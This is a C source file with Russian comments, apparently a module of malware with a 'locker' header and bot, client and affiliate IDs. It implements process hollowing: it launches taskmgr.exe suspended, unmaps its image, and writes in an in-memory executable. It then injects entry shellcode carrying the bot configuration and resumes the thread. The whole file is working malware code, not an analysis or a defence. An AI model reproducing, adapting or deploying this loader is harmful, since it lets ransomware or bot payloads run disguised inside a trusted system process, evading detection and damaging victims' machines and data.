#include "locker.h"
#include "exe_mem_loader.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) 

typedef struct _image_reloc
{
    uint16_t offset:12;
    uint16_t type:4;
} image_reloc_t, *pimage_reloc_t;

extern HANDLE gHProcess;
extern dll_block_t gDllBlock;
extern OSVERSIONINFO gOsVerInfo;
extern DWORD gProcessId;
wchar_t nameBuffer[MAX_PATH];


LONG ZwUnmapViewOfSection(void* ProcessHandle, void* BaseAddress);

#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)

#define GET_DIRECTORY_PTR(pNtHdrs, idx) &pNtHdrs->OptionalHeader.DataDirectory[idx]

int exe_mem_load(uint8_t* pBuffer)
{
    int ret = 0;
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs;
    STARTUPINFOW stInfo;
    PROCESS_INFORMATION pcInfo;
    PCONTEXT pContext;
    pvoid_t pView;
    uint8_t* currNewBase = NULL;
    uint8_t* newBase;
    SIZE_T tmpVal;
    uint16_t i;
    uint16_t numberOfSections;
    PIMAGE_SECTION_HEADER pSection;
    uintptr_t locationDelta;
    PIMAGE_DATA_DIRECTORY pDirectory;
    PIMAGE_BASE_RELOCATION pReloc;
    wchar_t* fileName = L"taskmgr.exe";
    pvoid_t origImageBase = NULL;
#ifdef _WIN64
    wchar_t* fullPath = (wchar_t*)nameBuffer;
    wchar_t* itr;
    int isTargetWow64 = FALSE;
    WOW64_CONTEXT* pWow64Context;
    uint8_t startSc64[24] = {0x48,0xB9,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x51,0x48,0xB8,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xFF,0xD0,0x00};
#endif // _WIN64
    uint8_t startSc[16] = {0xB8,0xAA,0xAA,0xAA,0xAA,0x50,0xB8,0xBB,0xBB,0xBB,0xBB,0xFF,0xD0,0x00,0x00,0x00};
    exe_block_t exeBlock, *pExeBlock;
    pvoid_t pStartSc;

    do {
        __stosb((uint8_t*)&pcInfo, 0, sizeof(PROCESS_INFORMATION));

        dosHdr = (PIMAGE_DOS_HEADER)pBuffer;
        ntHdrs = (PIMAGE_NT_HEADERS)(pBuffer + dosHdr->e_lfanew);

        __stosb((uint8_t*)&stInfo, 0, sizeof(STARTUPINFO));
        stInfo.cb = sizeof(STARTUPINFO);
        stInfo.lpDesktop = L"winsta0\\default";

#ifdef _WIN64
        if (ntHdrs->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            fullPath += GetSystemDirectoryW(fullPath, MAX_PATH);
        }
        else if (ntHdrs->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
            fullPath += GetSystemWow64DirectoryW(fullPath, MAX_PATH);
            isTargetWow64 = TRUE;
        }
        else {
            break;
        }

        if (*(fullPath - 1) != L'\\') {
            *(fullPath++) = L'\\';
        }

        for (itr = fileName; *itr != L'\0'; ++itr, ++fullPath) {
            *fullPath = *itr;
        }

        fileName = nameBuffer;
#endif // _WIN64

        if (gOsVerInfo.dwMajorVersion <= 5) {
            ret = CreateProcessW(fileName, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS, NULL, NULL, &stInfo, &pcInfo);
        }
        else {
            void* pToken;
            void* pTargetToken;
            uint32_t sessionId = 1;

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &pToken)) {
                break;
            }

            if (DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, 0, SecurityImpersonation, TokenPrimary, &pTargetToken) == 0) {
                break;
            }

            if (!SetTokenInformation(pTargetToken, (TOKEN_INFORMATION_CLASS)TokenSessionId, &sessionId, sizeof(sessionId))) {
                break;
            }

            ret  = CreateProcessAsUserW(pTargetToken, 0, fileName, 0, 0, TRUE, CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS, 0, 0, &stInfo, &pcInfo);

            CloseHandle(pToken);
            CloseHandle(pTargetToken);
        }

        if (!ret) {
            break;
        }
        ret = 0;

#ifdef _WIN64
        if (isTargetWow64) {
            pWow64Context = (WOW64_CONTEXT*)VirtualAlloc(NULL, ALIGN_UP_BY(sizeof(WOW64_CONTEXT), 4096), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            __stosb((uint8_t*)pWow64Context, 0, ALIGN_UP_BY(sizeof(WOW64_CONTEXT), 4096));
            pWow64Context->ContextFlags = WOW64_CONTEXT_FULL;

            if (!Wow64GetThreadContext(pcInfo.hThread, pWow64Context)) {
                break;
            }

            pView = NULL;
            if (!ReadProcessMemory(pcInfo.hProcess, (pvoid_t)((uint32_t)(pWow64Context->Ebx + 8)), &pView, sizeof(pView) >> 1, &tmpVal)) {
                break;
            }
        }
        else
#endif // _WIN64
        {
            pContext = (PCONTEXT)VirtualAlloc(NULL, ALIGN_UP_BY(sizeof(CONTEXT), 4096), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            __stosb((uint8_t*)pContext, 0, ALIGN_UP_BY(sizeof(CONTEXT), 4096));
            pContext->ContextFlags = CONTEXT_FULL;

            GetThreadContext(pcInfo.hThread, pContext);
#ifdef _WIN64
            if (!ReadProcessMemory(pcInfo.hProcess, (pvoid_t)(pContext->Rdx + 16), &pView, sizeof(pView), &tmpVal)) {
                break;
            }
#else
            if (!ReadProcessMemory(pcInfo.hProcess, (pvoid_t)(pContext->Ebx + 8), &pView, sizeof(pView), &tmpVal)) {
                break;
            }
#endif // _WIN64
        }

        // Выделяем временную память в текущем процессе, для подготовки образа.

        currNewBase = VirtualAlloc(NULL, ntHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (currNewBase == NULL) {
            break;
        }

        // Выделяем память в целевом процессе.
#ifdef _WIN64
        if (isTargetWow64) {
            origImageBase = (pvoid_t)((uint32_t)((PIMAGE_NT_HEADERS32)(ntHdrs))->OptionalHeader.ImageBase);
        }
        else
#endif // _WIN64
        {
            origImageBase = (pvoid_t)ntHdrs->OptionalHeader.ImageBase;
        }
        if (pView == origImageBase) {
            if (ZwUnmapViewOfSection(pcInfo.hProcess, pView) == 0) {
                newBase = VirtualAllocEx(pcInfo.hProcess, pView, ntHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            }
            else {
                newBase = VirtualAllocEx(pcInfo.hProcess, NULL, ntHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            }
        }
        else {
            newBase = VirtualAllocEx(pcInfo.hProcess, origImageBase, ntHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }

        if (newBase == NULL) {
            break;
        }

        // Копируем PE-заголовок, включая MZ-заголовк с DOS-стабом.
        __movsb(currNewBase, pBuffer, ntHdrs->OptionalHeader.SizeOfHeaders);

        // Копируем все секции.
#ifdef _WIN64
        if (isTargetWow64) {
            pSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)ntHdrs + FIELD_OFFSET(IMAGE_NT_HEADERS32, OptionalHeader) + ((PIMAGE_NT_HEADERS32)(ntHdrs))->FileHeader.SizeOfOptionalHeader);
        }
        else
#endif // _WIN64
        {
            pSection = IMAGE_FIRST_SECTION(ntHdrs);
        }
        numberOfSections = ntHdrs->FileHeader.NumberOfSections;

        for (i = 0; i < numberOfSections; ++i, ++pSection) {
            if (pSection->SizeOfRawData > 0) {
                __movsb(currNewBase + pSection->VirtualAddress, pBuffer + pSection->PointerToRawData, pSection->SizeOfRawData);
            }
        }

        if (newBase != (uint8_t*)origImageBase) {
            // Обрабатываем релоки.
            locationDelta = (newBase - (uint8_t*)origImageBase);
#ifdef _WIN64
            if (isTargetWow64) {
                pDirectory = &((PIMAGE_NT_HEADERS32)(ntHdrs))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            }
            else
#endif // _WIN64
            {
                pDirectory = GET_DIRECTORY_PTR(ntHdrs, IMAGE_DIRECTORY_ENTRY_BASERELOC);
            }

            if (pDirectory->Size > 0) {
                pReloc = (PIMAGE_BASE_RELOCATION)(currNewBase + pDirectory->VirtualAddress);
                for ( ; pReloc->SizeOfBlock != 0; ) {
                    uint8_t* dest = currNewBase + pReloc->VirtualAddress;
                    image_reloc_t* relInfo = (image_reloc_t*)((uint8_t*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                    for (i = (uint16_t)((pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(image_reloc_t)); i > 0; --i, ++relInfo) {
#ifdef _WIN64
                        if (relInfo->type == IMAGE_REL_BASED_DIR64) {
                            *(uintptr_t*)(dest + relInfo->offset) += locationDelta;
                        }
                        else
#endif // _WIN64
                            if (relInfo->type == IMAGE_REL_BASED_HIGHLOW) {
                                *(uint32_t*)(dest + relInfo->offset) += (uint32_t)locationDelta;
                            }
                            else if (relInfo->type == IMAGE_REL_BASED_HIGH) {
                                *(uint16_t*)(dest + relInfo->offset) += HIWORD(locationDelta);
                            }
                            else if (relInfo->type == IMAGE_REL_BASED_LOW) {
                                *(uint16_t*)(dest + relInfo->offset) += LOWORD(locationDelta);
                            }
                    }

                    // Переходим к следующей таблице с релоками.
                    pReloc = (PIMAGE_BASE_RELOCATION)((uint8_t*)pReloc + pReloc->SizeOfBlock);
                }
            }
        }

        if (!WriteProcessMemory(pcInfo.hProcess, newBase, currNewBase, ntHdrs->OptionalHeader.SizeOfImage, &tmpVal)) {
            break;
        }

        // Выделяем место для шеллкода, на который будет передано управление.
        pStartSc = VirtualAllocEx(pcInfo.hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (pStartSc == NULL) {
            break;
        }

        __movsb(exeBlock.installKey, gDllBlock.installKey, 3 * sizeof(exeBlock.installKey));
        __movsb(exeBlock.clientId, gDllBlock.clientId, 16/*CLIENT_ID_SIZE*/);
        __movsb(exeBlock.botId, gDllBlock.botId, 64/*CLIENT_ID_SIZE*/);
        exeBlock.affId = gDllBlock.affId;
        exeBlock.subId = gDllBlock.subId;

        pExeBlock = VirtualAllocEx(pcInfo.hProcess, NULL, sizeof(exe_block_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pExeBlock == NULL) {
            break;
        }
        if (!WriteProcessMemory(pcInfo.hProcess, (pvoid_t)pExeBlock, &exeBlock, sizeof(exe_block_t), &tmpVal)) {
            break;
        }

#ifdef _WIN64
        if (isTargetWow64) {
            *(uint32_t*)((char*)startSc + 1) = (uint32_t)pExeBlock;
            *(uint32_t*)((char*)startSc + 7) = (uint32_t)(newBase + ntHdrs->OptionalHeader.AddressOfEntryPoint);
            if (!WriteProcessMemory(pcInfo.hProcess, (pvoid_t)pStartSc, &startSc, sizeof(startSc), &tmpVal)) {
                break;
            }

            if (!WriteProcessMemory(pcInfo.hProcess, (pvoid_t)((uint32_t)(pWow64Context->Ebx + 8)), &newBase, sizeof(newBase) >> 1, &tmpVal)) {
                break;
            }
            pWow64Context->Eax = (ULONG)pStartSc;

            if (!Wow64SetThreadContext(pcInfo.hThread, pWow64Context)) {
                break;
            }
        }
        else
#endif
        {
#ifdef _WIN64
            *(uint64_t*)((char*)startSc64 + 2) = (uint64_t)pExeBlock;
            *(uint64_t*)((char*)startSc64 + 13) = (uint64_t)(newBase + ntHdrs->OptionalHeader.AddressOfEntryPoint);
            if (!WriteProcessMemory(pcInfo.hProcess, (pvoid_t)pStartSc, &startSc64, sizeof(startSc64), &tmpVal)) {
                break;
            }

            if (!WriteProcessMemory(pcInfo.hProcess, (pvoid_t)(pContext->Rdx + 16), &newBase, sizeof(newBase), &tmpVal)) {
                break;
            }
            pContext->Rcx = (LONGLONG)newBase + ntHdrs->OptionalHeader.AddressOfEntryPoint;
#else
            *(uint32_t*)((char*)startSc + 1) = (uint32_t)pExeBlock;
            *(uint32_t*)((char*)startSc + 7) = (uint32_t)(newBase + ntHdrs->OptionalHeader.AddressOfEntryPoint);

            if (!WriteProcessMemory(pcInfo.hProcess, (pvoid_t)pStartSc, &startSc, sizeof(startSc), &tmpVal)) {
                break;
            }
            if (!WriteProcessMemory(pcInfo.hProcess, (pvoid_t)(pContext->Ebx + 8), &newBase, sizeof(newBase), &tmpVal)) {
                break;
            }
            pContext->Eax = (ULONG)pStartSc;
#endif // _WIN64

            if (!SetThreadContext(pcInfo.hThread, pContext)) {
                break;
            }
        }

        ResumeThread(pcInfo.hThread);

        ret = 1;
    } while(0);

    if (pcInfo.hThread != NULL) {
        CloseHandle(pcInfo.hThread);
        gHProcess = pcInfo.hProcess;
        gProcessId = pcInfo.dwProcessId;
    }

    if (currNewBase != NULL) {
        VirtualFree(currNewBase, 0, MEM_RELEASE);
    }

    return ret;
}
